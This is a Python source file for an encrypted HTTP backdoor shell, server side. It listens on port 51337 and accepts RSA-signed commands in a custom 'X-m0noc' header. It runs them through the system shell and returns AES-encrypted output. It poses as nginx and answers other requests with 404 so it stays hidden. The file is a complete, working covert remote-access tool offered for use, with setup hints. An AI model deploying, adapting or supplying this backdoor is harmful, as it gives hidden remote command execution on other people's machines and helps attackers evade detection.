#
# Encrypted HTTP server shell - server side (with lots of debug)
# Author: Paul Bolton (m0noc), twitter: @overtsecrecy
#
# ctypes is a standard lib so if libcyrpto avail; sorted.
# TODO: Need to ensure we are not leaking too much memory
#
# Zip it up as __main__.py and pass the zip to python to run.
#
# Python 3 version
#
import sys, http.server, base64, subprocess, os
from ctypes import *

# Use your own key here - NOT THIS ONE
myKey = b"""-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqiKweKXFHY122Lh5TukS
0Wmf6KcPDEq7ZSMIb8tCfsZvt38rQw1j9mDuu096KU0EY3CC8GC+/veKC4gl9x98
4yhEcL4MDzeDlfsl7nTprkE2AosOxo+YkQYgErxWBKhUVXiR7Ia3YtXcMt5SVj7M
L0l1+eox5vRrHw5W3vPI5jvnJFLCPC/JBloIQxSfXKTCLhOAzmp723cUdCv8f/6c
K3ZAc00fW6yRp1zC0jhcJ8d6bIAj0Ybv0othyd4/VznUnc1kD/9iMHEOFc7zPb/3
untvZfR2z4Hm245cF0pAqoM/XYTPux9Ikfz3ZkEDrQSXh2Qk6zYf+aBBc8/CE1hd
DwIDAQAB
-----END PUBLIC KEY-----
"""
myKeyLen = int(2048 / 8)

class MyHandler(http.server.BaseHTTPRequestHandler):
    def aesEncrypt(s,plaintext):
        ssl = s.ssl
        ptLen = len(plaintext)
        # Here we use ctypes and libcrypto.so to ensure we are not dependent on
        # the installation of specific "Python" crypto libraries; which almost
        # certainly are going to use libcrypto anyway.

        randData = os.urandom(64)
        iv = randData[:32]
        key = randData[32:]
        print("[D] iv : " + repr(base64.b64encode(iv)))
        print("[D] key : " + repr(base64.b64encode(key)))

        ctx = ssl.EVP_CIPHER_CTX_new()
        print("[D] ctx: 0x%016x" % ctx)

        evpAes = ssl.EVP_aes_256_cbc()

        rc = ssl.EVP_EncryptInit_ex(c_void_p(ctx),c_void_p(evpAes),None,key,iv)
        print("[D] EVP_EncryptInit_ex rc: %d" % rc)

        ciphertext = create_string_buffer(2*ptLen + 32)
        ctRef = pointer(ciphertext)
        ctLen = c_int(0)
        ctLenRef = pointer(ctLen)

        rc = ssl.EVP_EncryptUpdate( c_void_p(ctx), ctRef, ctLenRef, plaintext, ptLen)
        print("[D] EVP_EncryptUpdate: %d, bytes written: %d" % (rc,ctLen.value))

        # Now we need to write the final block
        ctFinal = create_string_buffer(16)
        ctFinalRef = pointer(ctFinal)
        ctFinalLen = c_int(0)
        ctFinalLenRef = pointer(ctFinalLen)

        rc = ssl.EVP_EncryptFinal_ex( c_void_p(ctx), ctFinalRef, ctFinalLenRef )
        print("[D] EVP_EncryptFinal_ex: %d, bytes written: %d" % (rc,ctFinalLen.value))

        result = ciphertext[0:ctLen.value] + ctFinal[0:ctFinalLen.value]
        ciphertext = None
        ctFinal = None
        print("[D] result len: %d" % len(result))
        print("[D] result: " + repr(result))

        rc = ssl.EVP_CIPHER_CTX_free( c_void_p(ctx) )

        return iv, key, result
    def rsaOp(s,msg,encrypt=True):
        ssl = s.ssl
        print("[D] mykey: %s" % repr(myKey))
        keyBio = ssl.BIO_new_mem_buf( myKey, -1 )

        print("[D] BIO_new_mem_buf: 0x%016x" % keyBio)

        rsa = ssl.PEM_read_bio_RSA_PUBKEY( c_void_p(keyBio), None, None, None )
        if rsa is None:
            print("[E] PEM_read_bio_RSA_PUBKEY returned NULL")
            return None
        print("[D] PEM_read_bio_RSA_PUBKEY: 0x%016x" % rsa)

        # RSA_PKCS1_PADDING = 1
        ct = create_string_buffer(2*myKeyLen)
        ctRef = pointer(ct)
        print("[D] crypto msg: " + repr(msg))
        print("[D] length of msg: %d" % len(msg))
        
        if encrypt:
            print("[D] Calling RSA_public_encrypt")
            encLen = ssl.RSA_public_encrypt( len(msg), msg, ctRef, c_void_p(rsa), 1 )
        else:
            print("[D] Calling RSA_public_decrypt")
            encLen = ssl.RSA_public_decrypt( len(msg), msg, ctRef, c_void_p(rsa), 1 )
        print("[D] RSA_public_encrypt rc: %d" % encLen)
        #if encLen == -1:
        #    print("[D] Calling printLastError")
        #    pab.printLastError(b"[D] printLastError")

        result = ct[0:encLen]

        # Free BIO
        ssl.BIO_free_all( c_void_p( keyBio ) )
        ssl.RSA_free( c_void_p( rsa ) )
        ct = None

        # Result
        print("[D] RSA result: " + repr(result))

        return result
    def do_GET(s):
            s.send_response(404)
            s.end_headers()
            return
    def do_POST(s):
        s.ssl = CDLL("libcrypto.so")
        s.ssl.EVP_CIPHER_CTX_new.restype = c_void_p
        s.ssl.EVP_aes_256_cbc.restype = c_void_p
        s.ssl.BIO_new_mem_buf.restype = c_void_p
        s.ssl.PEM_read_bio_RSA_PUBKEY.restype = c_void_p

        # python3 http.server getheader() no longer present
        codeEncB64 = s.headers.get('X-m0noc')
        if codeEncB64 is None:
            s.do_GET()
            return
        codeEnc = base64.b64decode(codeEncB64)
        print("[D] Got header: %s" % codeEnc)
        code = s.rsaOp(codeEnc,encrypt=False)

        s.send_response(200)
        s.send_header("Content-type", "text/plain")
        s.end_headers()
        retOut = "**ERROR**"
        try:
            retOut = subprocess.check_output(code,shell=True,stderr=subprocess.STDOUT)
        except subprocess.CalledProcessError as e:
            retOut  = e.output
            retOut += "\nRETCODE: " + str(e.returncode)
        except:
            pass

        iv, key, encryptedOut = s.aesEncrypt(retOut)
        encryptedHdr = s.rsaOp(key+iv,encrypt=True)

        payload  = b""
        payload += encryptedHdr
        payload += encryptedOut

        encryptedOut = base64.b64encode(payload)

        s.wfile.write(encryptedOut)
        #print repr(s);
        return

if __name__ == '__main__':
    # Threading version is new in 3.7 so need fallback detection
    # TODO: python 2/3 combined ???
    try:
        svr = http.server.ThreadingHTTPServer
    except AttributeError:
        svr = http.server.HTTPServer

    MyHandler.server_version = 'nginx'
    MyHandler.sys_version = ''
    # May wish to pass port as parameter
    httpd = svr(('',51337),MyHandler)
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
